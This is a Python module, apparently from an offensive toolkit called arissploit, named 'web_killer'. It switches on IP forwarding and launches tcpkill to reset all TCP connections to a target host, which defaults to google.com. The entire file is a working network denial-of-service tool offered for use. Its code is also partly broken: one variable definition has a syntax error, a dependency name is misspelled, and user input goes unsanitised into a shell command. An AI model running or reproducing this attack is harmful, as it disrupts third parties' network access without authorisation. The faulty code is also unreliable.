from core.arissploit import *
import time
import os
import subprocess
from core import colors

conf = {
	"name": "web_killer",
	"version": "1.0",
	"shortdesc": "TCP attack.",
	"author": "Entynetproject",
	"initdate": "24.2.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"dependencies": ["dnsiff"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['wlan0', 'Network interface name'.]),
	('target', ['google.com', 'Target address.']),

))

# Simple changelog
changelog = "Version 1.0:\nrelease"

# Run
def run():
	variables['target'][0] = variables['target'][0].replace("http://", "")
	variables['target'][0] = variables['target'][0].replace("https://", "")
	printInfo("IP forwarding...")
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = colors.green + "Attack has been started, to stop attack press [enter]"
	press_ak = input(line_3)
	os.system('killall tcpkill')
	printInfo("Attack has been stoped.")
